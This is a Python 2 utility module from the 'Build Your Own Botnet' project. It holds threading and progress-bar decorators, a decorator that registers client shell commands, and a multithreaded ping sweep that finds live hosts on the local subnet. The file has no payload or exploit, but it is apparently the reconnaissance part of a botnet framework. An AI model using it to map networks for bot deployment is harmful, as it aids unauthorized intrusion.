
#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
import os
import sys
import time
import Queue
import socket
import colorama
import itertools
import functools
import threading

# globals
colorama.init()
LOCK = threading.Lock()
PROGRESS_BAR_LENGTH = 50
LOADING_ANIMATION_INTERVAL = 0.5


# worker function for the progress bar decorator
def _update_progress_bar(progress):
    if not isinstance(progress, float):
        with LOCK:
            raise ValueError("progress must be float")
    else:
        block = int(round(PROGRESS_BAR_LENGTH * progress))
        with LOCK:
            sys.stdout.write(colorama.Fore.RESET + colorama.Style.BRIGHT +\
                             "\r{}% ".format(round(progress * 100.0, 4)) +\
                             colorama.Fore.RED + colorama.Style.BRIGHT +\
                             '|' * block + colorama.Style.DIM +\
                             '-' * int(PROGRESS_BAR_LENGTH-block))
            sys.stdout.flush()


# Decorator for making a function threaded
def threaded(function):
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded


# Decorator to make a function a Client shell command
def command(*arg, **options):
    def _command(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return _command


# Decorator for displaying a loading animation while the function runs in a separate thread
def loading_animation(function):
    @functools.wraps(function)
    def _function(*args, **kwargs):
        animate = itertools.cycle(['Loading.  ','Loading.. ','Loading...'])
        _thread = threaded(function)(*args, **kwargs)
        while _thread.is_alive():
            with LOCK:
                sys.stdout.write("\r" + next(animate))
            time.sleep(LOADING_ANIMATION_INTERVAL)
    return _function


# Decorator for displaying a progress bar while the function is run in a separate thread
def progress_bar(function):
    @functools.wraps(function)
    def function_progress(task_queue):
        if isinstance(task_queue, Queue.Queue):
            total   = current = task_queue.unfinished_tasks
            percent = lambda: round(float(total - task_queue.qsize())/float(total), 4)
        elif isinstance(task_queue, bytes):
            task_queue = iter(task_queue)
            total   = len(task_queue)
            percent = lambda: round(float(total - len(task_queue))/float(total), 4)
        elif hasattr(task_queue, '__iter__'):
            total   = task_queue.__length_hint__()
            percent = lambda: round(float(total - task_queue.__length_hint__())/float(total), 4)
        else:
            with LOCK:
                raise TypeError("task queue must be a string, list, or queue (input type: %s)")
        t = threaded(function)(task_queue)
        while True:
            try:
                if task_queue.empty():
                    _update_progress_bar(1.0)
                    break
                elif task_queue.qsize() < current:
                    _update_progress_bar(percent())
                    current = task_queue.qsize()
            except:
                break
    return function_progress



# lan scanner

host_range  = []
alive_hosts = []
tasks       = Queue.Queue()
localIP     = socket.gethostbyname(socket.gethostname())

def _threader():
    while True:
        worker = tasks.get()
        _scan(worker)
        tasks.task_done()

def _scan(host):
    import subprocess
    try:
        resp = subprocess.check_output(['ping', '-c1', '-W90', host])
        alive_hosts.append(host)
    except: return

def getLocalIP():
    return localIP

def getTargets(h_range = (1, 255)):
    localip = getLocalIP()
    stub = '.'.join(localip.split('.')[:-1])
    return [str(stub + '.' + str(i)) for i in range(h_range[0], h_range[1])]

@progress_bar
def scan(tasks):
    n = 100 #int(tasks.qsize() if isinstance(tasks, Queue.Queue) else (tasks.__length_hint__() if isinstance(tasks, list) else len(tasks)))/10
    print 'Launching %d threads...' % n
    for x in range(n):
        t = threading.Thread(target=_threader)
        t.daemon = True
        t.start()
    tasks.join()
    result = list(set(alive_hosts))
    print 'Local Area Network'
    print '\n'.join(result)
    return result

def run():
    print 'Scanning local area network for online hosts...'
    for worker in getTargets():
        tasks.put(worker)
    scan(tasks)


if __name__ == '__main__':
    run()
